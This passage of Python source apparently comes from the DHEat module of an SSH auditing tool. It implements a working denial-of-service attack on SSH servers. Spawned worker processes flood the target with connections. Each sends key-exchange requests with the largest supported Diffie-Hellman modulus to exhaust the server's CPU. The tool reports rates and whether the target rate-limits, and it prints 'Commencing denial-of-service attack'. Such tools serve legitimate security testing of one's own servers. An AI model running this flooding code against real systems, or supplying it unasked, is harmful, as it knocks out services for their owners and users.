        print("                  Read timeouts: %s%.1f/sec, %u total%s (timeout setting: %.1f sec)" % (self.WHITEB, self.num_read_timeouts / seconds_running, self.num_read_timeouts, self.CLEAR, self.read_timeout))
        print("              Socket exceptions: %s%.1f/sec, %u total%s" % (self.WHITEB, self.num_socket_exceptions / seconds_running, self.num_socket_exceptions, self.CLEAR))
        print()

        if seconds_running < 5.0:
            print("%sTotal run time was under 5 seconds; try running it for longer to get more accurate analysis.%s" % (DHEat.YELLOWB, DHEat.CLEAR))
        elif self.num_successful_tcp_connections / seconds_running < DHEat.MAX_SAFE_RATE:
            print("Because the number of successful TCP connections per second (%.1f) is less than %.1f, it appears that the target %sis using rate limiting%s to prevent CPU exaustion." % (self.num_successful_tcp_connections / seconds_running, DHEat.MAX_SAFE_RATE, DHEat.GREENB, DHEat.CLEAR))
        else:
            print("Because the number of successful TCP connections per second (%.1f) is greater than %.1f, it appears that the target %sis NOT using rate limiting%s to prevent CPU exaustion." % (self.num_successful_tcp_connections / seconds_running, DHEat.MAX_SAFE_RATE, DHEat.REDB, DHEat.CLEAR))

        print()
        print()
        print(" * OpenSSH has a throttling mechanism (controlled by the MaxStartups directive) to prevent too many pre-authentication connections from overwhelming the server.  When triggered, the server will probabilistically return \"Exceeded MaxStartups\" instead of the usual SSH banner, then terminate the connection.  In order to maximize the DoS effectiveness, this metric should be greater than zero, though the ideal rate of rejections depends on the target server's CPU resources.")
        print()


    def _run(self) -> bool:
        '''Where all the magic happens.'''


        self.output()
        if sys.platform == "win32":
            self.output("%sWARNING:%s this feature has not been thoroughly tested on Windows.  It may perform worse than on UNIX OSes." % (self.YELLOWB, self.CLEAR))

        self.output("Running DHEat test against %s[%s]:%u%s with %s%u%s concurrent sockets..." % (self.WHITEB, self.target, self.port, self.CLEAR, self.WHITEB, self.concurrent_connections, self.CLEAR))

        # If the user didn't specify an exact kex algorithm to test, check our prioritized list against what the server supports.  Larger p-values (such as group18: 8192-bits) cause the most strain on the server.
        chosen_alg = ""
        gex_modulus_size = -1
        if self.target_kex == "":

            # Look through the server's kex list and see if any are GEX algorithms.  To save time, we will only check the first GEX we encounter, instead of all of them (I assume the results will be the same anyway).
            server_gex_alg = ""
            for server_kex in self.kex.kex_algorithms:
                if server_kex in DHEat.gex_algs:
                    server_gex_alg = server_kex
                    break

            # If the server supports at least one gex algorithm, find the largest modulus it supports.  Store an entry in the alg_modulus_sizes so we remember this for later.
            if server_gex_alg != "":
                # self.output("Analyzing server's group exchange algorithm, %s, to find largest modulus it supports..." % (server_gex_alg))
                gex_modulus_size = self.analyze_gex(server_gex_alg)
                # self.output("The largest modulus supported by %s appears to be %u." % (server_gex_alg, largest_bit_modulus))

            # Now choose the KEX/GEX with the largest modulus that is supported by the server.
            chosen_alg = ""
            for alg in DHEat.alg_priority:
                if alg in self.kex.kex_algorithms:
                    chosen_alg = alg
                    break

            # If the server's kex options don't intersect with our prioritized algorithm list, then we cannot run this test.
            if chosen_alg == "":
                self.out.fail("Error: server's key exchange algorithms do not match with any algorithms implemented by this client!")
                self.out.warn("Server's key exchanges: \n  * %s" % ("\n  * ".join(self.kex.kex_algorithms)))
                self.out.warn("Client's key exchanges: \n  * %s" % ("\n  * ".join(DHEat.alg_priority)))
                return False

            self.debug("Chose [%s] from prioritized list: [%s]" % (chosen_alg, ", ".join(DHEat.alg_priority)))

        else:  # The user specified an exact algorithm to test.

            # If the user chose an algorithm we don't have an implementation for...
            if (self.target_kex not in DHEat.alg_priority) and (self.target_kex not in DHEat.gex_algs):
                self.out.fail("Specified target key exchange [%s] is not in list of implemented algorithms: [%s]." % (self.target_kex, ", ".join(DHEat.alg_priority)))
                return False

            # Ensure that what the user chose is supported by the server.
            if self.target_kex not in self.kex.kex_algorithms:
                self.out.fail("Specified target key exchange [%s] is not supported by the server: [%s]." % (self.target_kex, ", ".join(self.kex.kex_algorithms)))
                return False

            # If this is a GEX, find the largest modulus it supports.
            if self.target_kex in DHEat.gex_algs:
                gex_modulus_size = self.analyze_gex(self.target_kex)

            chosen_alg = self.target_kex

        self.output("Targeting server algorithm: %s%s%s (modulus size: %u)" % (self.WHITEB, chosen_alg, self.CLEAR, DHEat.alg_modulus_sizes[chosen_alg]))

        if self.user_set_e_len and chosen_alg not in self.HARDCODED_ALGS:
            self.output("Using user-supplied e length: %u" % (self.e_rand_len))
            if chosen_alg in self.COMPLEX_PQ_ALGS:
                self.output("{:s}NOTE:{:s} short e lengths can work against the post-quantum algorithm targeted, but the current implementation of this attack results in protocol errors; the number of successful DH KEX replies will be reported as zero even though the CPU will still be exhausted.".format(self.YELLOWB, self.CLEAR))
        elif self.user_set_e_len and chosen_alg in self.HARDCODED_ALGS:
            self.output("{:s}NOTE:{:s} ignoring user-supplied e length, since the targeted algorithm (a NIST P-curve) must use hard-coded e values.".format(self.YELLOWB, self.CLEAR))

        # If an untested DH alg is chosen, ask the user to e-mail the maintainer/create a GitHub issue to report success.
        if chosen_alg not in DHEat.tested_algs:
            self.output()
            self.output(DHEat.untested_alg_notice.format(color_start=self.YELLOWB, color_end=self.CLEAR, dh_alg=chosen_alg))

        self.output()
        self.output("Commencing denial-of-service attack.  Validate results by monitoring target's CPU idle status.")
        self.output()
        self.output("Press CTRL-C to stop attack and see statistics.")
        self.output()

        self.generate_kex(chosen_alg)

        # If the user didn't already choose the e length, calculate the length of the random bytes we need to generate the value e that we'll send to the server.
        if not self.user_set_e_len:
            self.e_rand_len = int(DHEat.alg_modulus_sizes[chosen_alg] / 8) - 1
            # self.debug("Setting e_rand_len to %u." % self.e_rand_len)

        # Create all the processes.
        multiprocessing.set_start_method("spawn")
        q: Any = multiprocessing.Queue()
        for _ in range(0, self.concurrent_connections):
            p = multiprocessing.Process(target=self.worker_process, args=(q, chosen_alg, gex_modulus_size,))
            p.start()

        spinner = ["-", "\\", "|", "/"]
        spinner_index = 0

        # Read the statistics from the child processes, and update the UI once per second.
        last_update = time.time()
        while True:

            try:
                # Ensure an upper bound of 5 seconds without updating the UI.
                for _ in range(0, 5):
                    thread_statistics = q.get(True, 1.0)  # Block for up to 1 second.
                    self.num_attempted_tcp_connections += thread_statistics['num_attempted_tcp_connections']
                    self.num_successful_tcp_connections += thread_statistics['num_successful_tcp_connections']
                    self.num_successful_dh_kex += thread_statistics['num_successful_dh_kex']
                    self.num_failed_dh_kex += thread_statistics['num_failed_dh_kex']
                    self.num_bytes_written += thread_statistics['num_bytes_written']
                    self.num_connect_timeouts += thread_statistics['num_connect_timeouts']
                    self.num_read_timeouts += thread_statistics['num_read_timeouts']
                    self.num_socket_exceptions += thread_statistics['num_socket_exceptions']
                    self.num_openssh_throttled_connections += thread_statistics['num_openssh_throttled_connections']
            except queue.Empty:  # If Queue.get() timeout exceeded.
                pass

            now = time.time()
            if (now - last_update) >= 1.0:
                seconds_running = now - self.start_timer
                print("%s%s%s TCP SYNs/sec: %s%u%s; Compl. conns/sec: %s%u%s; Bytes sent/sec: %s%s%s; DH kex/sec: %s%u%s    \r" % (self.WHITEB, spinner[spinner_index], self.CLEAR, self.BLUEB, self.num_attempted_tcp_connections / seconds_running, self.CLEAR, self.BLUEB, self.num_successful_tcp_connections / seconds_running, self.CLEAR, self.BLUEB, DHEat.add_byte_units(self.num_bytes_written / seconds_running), self.CLEAR, self.PURPLEB, self.num_successful_dh_kex / seconds_running, self.CLEAR), end="")
                last_update = now
                spinner_index = (spinner_index + 1) % 4


    def worker_process(self, q: Any, chosen_alg: str, gex_modulus_size: int) -> None:
        '''Worker process that floods the target.'''

        # Handle CTRL-C gracefully.
        try:
            self._worker_process(q, chosen_alg, gex_modulus_size)
        except KeyboardInterrupt:
            pass


    def _worker_process(self, q: Any, chosen_alg: str, gex_modulus_size: int) -> None:
        '''Worker process that floods the target.'''


        def _close_socket(s: socket.socket) -> None:
            try:
                s.shutdown(socket.SHUT_RDWR)
                s.close()
            except OSError:
                pass


        # Copy variables from the object (which might exist in another process?).  This might cut down on inter-process overhead.
        connect_timeout = self.connect_timeout
        target = self.target
        port = self.port

        # Determine if we are attacking with a GEX.
        gex_mode = False
        if chosen_alg in DHEat.gex_algs:
            gex_mode = True
            self.debug("Setting GEX mode to True; gex_modulus_size: %u" % gex_modulus_size)

        # Attack statistics local to this process.
        num_attempted_tcp_connections = 0
        num_successful_tcp_connections = 0
        num_successful_dh_kex = 0
        num_failed_dh_kex = 0
        num_bytes_written = 0
        num_connect_timeouts = 0
        num_read_timeouts = 0
        num_socket_exceptions = 0
        num_openssh_throttled_connections = 0

        num_loops_since_last_statistics_sync = 0
        while True:
            num_loops_since_last_statistics_sync += 1

            # Instead of flooding the parent process with statistics, report our stats only every 5 connections.
            if num_loops_since_last_statistics_sync > 5:
                num_loops_since_last_statistics_sync = 0

                q.put({
                    'num_attempted_tcp_connections': num_attempted_tcp_connections,
                    'num_successful_tcp_connections': num_successful_tcp_connections,
                    'num_successful_dh_kex': num_successful_dh_kex,
                    'num_failed_dh_kex': num_failed_dh_kex,
                    'num_bytes_written': num_bytes_written,
                    'num_connect_timeouts': num_connect_timeouts,
                    'num_read_timeouts': num_read_timeouts,
                    'num_socket_exceptions': num_socket_exceptions,
                    'num_openssh_throttled_connections': num_openssh_throttled_connections,
                })

                # Since we sent our statistics, reset them all back to zero.
                num_attempted_tcp_connections = 0
                num_successful_tcp_connections = 0
                num_successful_dh_kex = 0
                num_failed_dh_kex = 0
                num_bytes_written = 0
                num_connect_timeouts = 0
                num_read_timeouts = 0
                num_socket_exceptions = 0
                num_openssh_throttled_connections = 0

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(connect_timeout)

            # Loop until a successful TCP connection is made.
            connected = False
            while not connected:

                # self.debug("Connecting to %s:%d" % (self.target, self.port))
                try:
                    num_attempted_tcp_connections += 1
                    s.connect((target, port))
                    connected = True
                except OSError as e:
                    self.debug("Failed to connect: %s" % str(e))

            # Send everything all at once.  This isn't technically valid to do, but SSH implementations seem to be fine with it.
            bytes_to_write = b""
            if gex_mode:
                bytes_to_write = self.banner + self.make_kexinit() + self.make_gex_request(gex_modulus_size)
            else:
                bytes_to_write = self.banner + self.make_kexinit() + self.make_dh_kexinit(chosen_alg)

            try:
                s.sendall(bytes_to_write)
                num_bytes_written += len(bytes_to_write)
            except (ConnectionResetError, BrokenPipeError):
                num_socket_exceptions += 1
            except socket.timeout:
                num_connect_timeouts += 1

            banner, extra = self.read_banner(s)
            if banner == b'':
                self.debug("Blank banner received.")
                _close_socket(s)
                num_socket_exceptions += 1
                continue

            # If we receive a valid SSH banner from the server, we'll count it as a successful connection.  Note that OpenSSH returns "Exceeded MaxStartups" when throttling occurs (due to the MaxStartups setting).
            if banner.startswith(b"SSH-2.0-") or banner.startswith(b"SSH-1"):
                num_successful_tcp_connections += 1
            elif banner == b'Exceeded MaxStartups':
                num_openssh_throttled_connections += 1
                _close_socket(s)
                continue
            else:
                self.debug("Invalid banner received: %r" % banner)
                _close_socket(s)
                continue

            # Read the KEXINIT from the server.
            message_code = -1
            try:
                message_code, _ = self.read_ssh_packet(s, extra=extra)
                # self.debug("Message code: %u" % message_code)
            except (ConnectionResetError, socket.timeout) as e:
                num_failed_dh_kex += 1
                num_socket_exceptions += 1
                _close_socket(s)
                self.debug("Exception in read_ssh_packet: %s" % str(e))
                continue

            # Ensure that we received Key Exchange Init (20).
            if message_code != 20:
                num_failed_dh_kex += 1
                _close_socket(s)
                self.debug("Expected Kex Exchange Init (20), received: %u" % message_code)
                continue

            # Read the Diffie-Hellman Key Exchange Init from the server.
            message_code = -1
            try:
                message_code, gex_msb = self.read_ssh_packet(s)
                # self.debug("Message code: %u" % message_code)
            except (ConnectionResetError, socket.timeout) as e:
                num_failed_dh_kex += 1
                num_socket_exceptions += 1
                _close_socket(s)
                self.debug("Exception in read_ssh_packet: %s" % str(e))
                continue

            # If we get message code 31, then we know the server properly handled our Diffie-Hellman Key Exchange Init, and thus, wasted its time.
            if message_code == 31:

                if not gex_mode:
                    num_successful_dh_kex += 1

                # If we're targeting a GEX, we need to send and receive another set of packets.
                else:
                    # Send the Diffie-Hellman Group Exchange Init (32).
                    bytes_to_write = self.make_dh_kexinit(chosen_alg, gex_msb=gex_msb)
                    try:
                        s.sendall(bytes_to_write)
                        num_bytes_written += len(bytes_to_write)
                    except (ConnectionResetError, BrokenPipeError):
                        num_socket_exceptions += 1
                    except socket.timeout:
                        num_connect_timeouts += 1

                    try:
                        message_code, _ = self.read_ssh_packet(s)
                    except (ConnectionResetError, socket.timeout) as e:
                        num_failed_dh_kex += 1
                        num_socket_exceptions += 1
                        _close_socket(s)
                        self.debug("Exception in read_ssh_packet: %s" % str(e))
                        continue

                    # If we received Diffie-Hellman Group Exchange Reply (33), then we know the server properly handled our Diffie-Hellman Group Exchange Init (32), and thus, wasted its time.
                    if message_code == 33:
                        num_successful_dh_kex += 1
                    else:
                        num_failed_dh_kex += 1

            else:
                num_failed_dh_kex += 1

            _close_socket(s)
